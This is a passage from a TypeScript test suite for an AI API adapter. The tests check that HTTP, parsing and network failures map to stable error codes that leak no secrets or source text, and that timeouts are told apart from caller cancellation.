  assert.equal(openCount, 1);
});

test('HTTP, invalid JSON, empty and network failures use stable non-sensitive error codes', async () => {
  const cases: Array<{ code: string; fetch: typeof fetch }> = [
    { code: 'unauthorized', fetch: async () => jsonResponse({ error: { message: 'echo secret-key' } }, 401) },
    { code: 'model_not_found', fetch: async () => jsonResponse({}, 404) },
    { code: 'model_not_found', fetch: async () => jsonResponse({ error: { code: 'invalid_model' } }, 400) },
    { code: 'rate_limited', fetch: async () => jsonResponse({}, 429) },
    { code: 'server_error', fetch: async () => jsonResponse({}, 503) },
    { code: 'invalid_response', fetch: async () => new Response('not-json', { status: 200 }) },
    { code: 'empty_response', fetch: async () => jsonResponse({ choices: [{ message: { content: ' ' } }] }) },
    { code: 'network_error', fetch: async () => { throw new TypeError('CORS failed with secret-key'); } },
  ];
  for (const item of cases) {
    const adapter = createPublicAiAdapter({ readConfig: () => configured(), fetch: item.fetch });
    await assert.rejects(adapter.request({
      action: 'generate',
      source: 'private full source',
      sourceKind: 'text',
      range: { start: 0, end: 0 },
    }), (error: unknown) => {
      assert.ok(error instanceof PublicAiError);
      assert.equal(error.code, item.code);
      assert.doesNotMatch(error.message, /secret-key|private full source/u);
      assert.equal(error.cause, undefined);
      return true;
    });
  }
});

test('adapter distinguishes timeout from caller cancellation', async () => {
  const pendingFetch: typeof fetch = async (_input, init) => new Promise<Response>((_resolve, reject) => {
    init?.signal?.addEventListener('abort', () => reject(new DOMException('Aborted', 'AbortError')), { once: true });
  });
  const timeoutAdapter = createPublicAiAdapter({
    readConfig: () => configured(),
    fetch: pendingFetch,
    timeoutMs: 5,
  });
  await assert.rejects(timeoutAdapter.request({
    action: 'generate',
    source: '',
    sourceKind: 'text',
    range: { start: 0, end: 0 },
  }), (error: unknown) => (
    error instanceof PublicAiError && error.code === 'timeout'
  ));

  const controller = new AbortController();
  const cancelAdapter = createPublicAiAdapter({ readConfig: () => configured(), fetch: pendingFetch });
  const promise = cancelAdapter.request({
    action: 'generate',
    source: '',
    sourceKind: 'text',
    range: { start: 0, end: 0 },
    signal: controller.signal,
  });
  controller.abort();
  await assert.rejects(promise, (error: unknown) => (
    error instanceof PublicAiError && error.code === 'aborted'
  ));

  const alreadyAborted = new AbortController();
  alreadyAborted.abort();
  await assert.rejects(cancelAdapter.request({
    action: 'generate',
    source: '',
    sourceKind: 'text',
    range: { start: 0, end: 0 },
    signal: alreadyAborted.signal,
  }), (error: unknown) => (
    error instanceof PublicAiError && error.code === 'aborted'
  ));
});
